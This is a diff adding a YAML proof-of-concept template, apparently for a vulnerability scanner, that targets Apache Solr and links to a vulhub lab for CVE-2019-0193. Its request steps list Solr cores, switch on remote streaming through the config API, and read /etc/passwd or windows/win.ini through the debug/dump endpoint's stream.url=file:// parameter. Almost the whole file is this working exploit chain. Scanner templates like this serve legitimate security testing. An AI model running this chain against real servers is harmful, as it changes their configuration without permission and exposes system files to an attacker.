@@ -1,0 +1,56 @@
+name: poc-yaml-solr-any-file-read
+groups:
+  linux:
+    - method: GET
+      path: /solr/admin/cores?wt=json
+      follow_redirects: false
+      expression: response.status == 200 && response.body.bcontains(b"responseHeader")
+      search: '"name":"(?P<core>.*?)"'
+    - method: POST
+      path: >-
+        /solr/{{core}}/config
+      headers:
+        Content-Type: application/json
+      body: |-
+        {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+      follow_redirects: false
+      expression: response.status == 200 && response.body.bcontains(bytes("\"status\":0")) && response.body.bcontains(bytes("responseHeader"))
+    - method: POST
+      path: >-
+        /solr/{{core}}/debug/dump?param=ContentStreams
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |-
+        stream.url=file:///etc/passwd
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  windows:
+    - method: GET
+      path: /solr/admin/cores?wt=json
+      follow_redirects: false
+      expression: response.status == 200 && response.body.bcontains(b"responseHeader")
+      search: '"name":"(?P<core>.*?)"'
+    - method: POST
+      path: >-
+        /solr/{{core}}/config
+      headers:
+        Content-Type: application/json
+      body: |-
+        {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+      follow_redirects: false
+      expression: response.status == 200 && response.body.bcontains(bytes("\"status\":0")) && response.body.bcontains(bytes("responseHeader"))
+    - method: POST
+      path: >-
+        /solr/{{core}}/debug/dump?param=ContentStreams
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |-
+        stream.url=file:///c://windows/win.ini
+      follow_redirects: false
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+detail:
+  author: jweny(https://github.com/jweny)
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193
